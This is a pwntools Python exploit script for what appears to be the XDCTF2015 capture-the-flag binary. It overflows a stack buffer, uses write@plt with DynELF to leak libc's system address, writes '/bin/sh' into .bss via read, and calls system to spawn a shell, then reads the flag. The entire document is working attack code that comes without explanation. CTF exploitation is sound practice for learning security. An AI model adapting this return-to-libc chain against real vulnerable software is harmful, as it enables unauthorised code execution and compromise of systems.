from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x080484bd
continue
'''.format(**locals())

#Binary filename
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

junk = b"a" * 0x70
start_addr = 0x80483d0
func_addr = 0x8048484

p.recvuntil(b"Welcome to XDCTF2015~!\n")

def leak(address):
    payload = junk + p32(elf.plt['write']) + p32(func_addr) +p32(1) + p32(address) +p32(4)
    p.send(payload)
    data = p.recv(4)
    print(hex(u32(data)))
    return data

dyn = DynELF(leak, elf = ELF('./vuln'))
sys_addr = dyn.lookup('system', 'libc')
print("sys_add = " + hex(sys_addr))

payload = junk + p32(start_addr)
p.send(payload)

pop_3 = 0x0804856c #(ebx, edi, ebp)
bin_sh = elf.bss()

p.recvuntil(b"Welcome to XDCTF2015~!\n")
payload = junk + p32(elf.plt['read']) + p32(pop_3) + p32(0) + p32(bin_sh) + p32(20)
payload += p32(sys_addr) + p32(0) +p32(bin_sh)

p.send(payload)

p.send("/bin/sh")

time.sleep(0.5)

p.send("cat flag")

p.interactive()
